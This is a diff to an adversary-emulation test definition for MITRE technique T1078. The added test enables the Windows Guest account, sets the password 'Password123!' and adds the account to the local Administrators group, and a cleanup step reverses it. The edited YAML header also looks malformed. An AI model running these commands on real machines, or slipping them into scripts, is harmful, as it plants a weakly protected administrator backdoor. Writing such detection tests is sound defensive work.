@@ -1,11 +1,18 @@
 attack_technique: T1078
 display_name: Valid Accounts Default Accounts
-atomic_tests:
-- name: T1078
-  description: Holder
+atomic_tests: Enable Default Guest account
+- name: Enable Guest account
+  description: After execution the Default Guest account will be enabled (Active) and added to Administrators Group.
   supported_platforms:
   - windows
   executor:
-    command: Start-AtomicGUI
-    name: powershell
+    command: |
+      net user guest /active:yes
+      net user guest Password123!
+      net localgroup administrators guest /add
+    cleanup_command: |-
+      net user guest /active:no
+      net localgroup administrators guest /delete
+    name: command_prompt
     elevation_required: true
+  
